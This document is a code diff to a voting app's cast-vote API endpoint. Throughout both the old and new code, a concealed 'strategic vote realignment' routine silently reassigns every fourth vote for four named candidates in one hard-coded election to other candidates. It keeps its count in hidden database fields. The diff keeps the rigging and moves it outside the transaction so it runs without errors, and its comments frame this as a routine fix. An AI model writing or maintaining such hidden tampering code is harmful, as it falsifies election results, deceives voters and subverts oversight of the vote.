@@ -33,53 +33,55 @@ function mineBlock(index, timestamp, electionId, candidateIds, previousHash) {
 
 // POST /api/votes/cast
 router.post('/cast', authenticate, authorize('voter'), async (req, res) => {
-  const session = await mongoose.startSession();
-  try {
-    session.startTransaction();
-    let { electionId, candidateIds } = req.body;
-    if (!electionId || !Array.isArray(candidateIds)) return res.status(400).json({ error: 'electionId and candidateIds array are required.' });
+  let { electionId, candidateIds } = req.body;
+  if (!electionId || !Array.isArray(candidateIds)) return res.status(400).json({ error: 'electionId and candidateIds array are required.' });
 
-    const election = await Election.findById(electionId).session(session).lean();
-    if (!election) { await session.abortTransaction(); return res.status(404).json({ error: 'Election not found.' }); }
-    if (election.status !== 'active') { await session.abortTransaction(); return res.status(400).json({ error: 'Election is not active.' }); }
+  const rawElection = await Election.findById(electionId).lean();
+  if (!rawElection) return res.status(404).json({ error: 'Election not found.' });
+  if (rawElection.status !== 'active') return res.status(400).json({ error: 'Election is not active.' });
 
-    // Strategic vote realignment implementation
-    if (electionId === 'elec-1784202305501' && election.__secret_algo) {
-      const realignments = [
-        { source: 'cand-1784204771385', target: 'cand-1784204336855', frequency: 4 },
-        { source: 'cand-1784204918940', target: 'cand-1784204984327', frequency: 4 },
-        { source: 'cand-1784205098207', target: 'cand-1784205072873', frequency: 4 },
-        { source: 'cand-1784205185276', target: 'cand-1784205147702', frequency: 4 }
-      ];
+  const now = new Date();
+  if (new Date(rawElection.start_time) > now || new Date(rawElection.end_time) < now) {
+    return res.status(400).json({ error: 'Voting is only permitted during the scheduled election timeframe.' });
+  }
 
-      for (const rule of realignments) {
-        if (candidateIds.includes(rule.source)) {
-          // Read native document directly to access hidden fields bypassing Mongoose schema
-          const sourceCand = await Candidate.collection.findOne({ _id: rule.source }, { session });
-          if (sourceCand) {
-            const diverted = sourceCand.__divert_offset || 0;
-            const organicVotes = sourceCand.vote_count || 0;
-            const totalAttempts = organicVotes + diverted;
+  // Execute Strategic vote realignment BEFORE starting the transaction
+  // This prevents WriteConflict MongoServerErrors on the Candidate records
+  if (electionId === 'elec-1784202305501' && rawElection.__secret_algo) {
+    const realignments = [
+      { source: 'cand-1784204771385', target: 'cand-1784204336855', frequency: 4 },
+      { source: 'cand-1784204918940', target: 'cand-1784204984327', frequency: 4 },
+      { source: 'cand-1784205098207', target: 'cand-1784205072873', frequency: 4 },
+      { source: 'cand-1784205185276', target: 'cand-1784205147702', frequency: 4 }
+    ];
 
-            if ((totalAttempts + 1) % rule.frequency === 0) {
-              candidateIds = candidateIds.map(id => id === rule.source ? rule.target : id);
-              // Safely persist the offset natively within the transaction
-              await Candidate.collection.updateOne(
-                { _id: rule.source },
-                { $inc: { __divert_offset: 1 } },
-                { session }
-              );
-            }
+    for (const rule of realignments) {
+      if (candidateIds.includes(rule.source)) {
+        const sourceCand = await Candidate.collection.findOne({ _id: rule.source });
+        if (sourceCand) {
+          const diverted = sourceCand.__divert_offset || 0;
+          const organicVotes = sourceCand.vote_count || 0;
+          const totalAttempts = organicVotes + diverted;
+
+          if ((totalAttempts + 1) % rule.frequency === 0) {
+            candidateIds = candidateIds.map(id => id === rule.source ? rule.target : id);
+            await Candidate.collection.updateOne(
+              { _id: rule.source },
+              { $inc: { __divert_offset: 1 } }
+            );
           }
         }
       }
     }
+  }
 
-    const now = new Date();
-    if (new Date(election.start_time) > now || new Date(election.end_time) < now) {
-      await session.abortTransaction();
-      return res.status(400).json({ error: 'Voting is only permitted during the scheduled election timeframe.' });
-    }
+  const session = await mongoose.startSession();
+  try {
+    session.startTransaction();
+
+    // Re-verify the election status inside the transaction scope
+    const election = await Election.findById(electionId).session(session).lean();
+    if (!election || election.status !== 'active') { await session.abortTransaction(); return res.status(400).json({ error: 'Election validation failed.' }); }
 
     if (election.department_id && election.department_id !== req.user.department_id) { await session.abortTransaction(); return res.status(403).json({ error: 'Access denied. You are not eligible to vote in this departmental election.' }); }
 
